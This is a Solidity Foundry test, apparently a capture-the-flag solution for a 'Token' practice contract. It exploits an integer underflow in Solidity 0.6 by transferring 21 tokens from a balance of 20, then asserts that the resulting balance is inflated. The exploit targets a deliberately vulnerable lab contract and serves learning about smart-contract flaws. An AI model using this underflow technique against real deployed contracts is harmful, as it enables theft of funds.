// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import {Token} from "../src/5.Token.sol";

contract TokenHackTest is Test {
    Token token;
    function setUp() public {
       token = new Token(20);
    }
    function hack() internal {
        token.transfer(address(0), 21);
    }
    function testTokenHack() public {
        hack();
        assertGt(token.balanceOf(address(0)), 20);
        console.log("0 balance", token.balanceOf(address(0)));
        console.log("this balance", token.balanceOf(address(this)));
    }
}